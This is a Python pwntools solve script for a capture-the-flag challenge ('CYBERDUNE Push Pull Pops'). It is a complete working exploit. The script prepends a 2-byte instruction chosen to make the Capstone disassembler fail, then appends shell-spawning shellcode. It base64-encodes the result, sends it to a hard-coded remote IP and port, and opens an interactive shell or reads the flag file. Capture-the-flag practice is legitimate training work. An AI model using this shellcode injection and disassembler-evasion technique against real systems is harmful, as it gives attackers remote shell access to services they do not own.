#!/usr/bin/env python3
# Example solve script for the CYBERDUNE Push Pull Pops challenge.
# This script uses pwntools to assemble and send a payload.
#
# Requirements: pip install pwntools

import base64
from pwn import remote, context, asm, shellcraft

context.clear(arch='amd64')

# host/port - adjust if you're hitting a remote instance
HOST = "159.223.23.56"
PORT = 31341

def craft_payload():
    # small 2-byte instruction that causes Capstone to fail on some versions:
    prefix = b"\x63\xc8"  # movsxd ecx, eax (problematic for the disassembler)
    shell = asm(shellcraft.sh())
    return base64.b64encode(prefix + shell)

def exploit():
    payload = craft_payload()
    print("Payload (base64):", payload.decode())
    io = remote(HOST, PORT, timeout=10)
    # receive prompt
    data = io.recvline(timeout=2)
    print(data.decode(errors='ignore').strip())
    io.sendline(payload)
    # give a little time for shell
    try:
        io.interactive()
    except Exception as e:
        # if interactive fails, try to read the flag directly
        try:
            io.sendline(b"cat app/flag.txt")
            print(io.recvline(timeout=2).decode())
        except Exception:
            pass

if __name__ == "__main__":
    exploit()
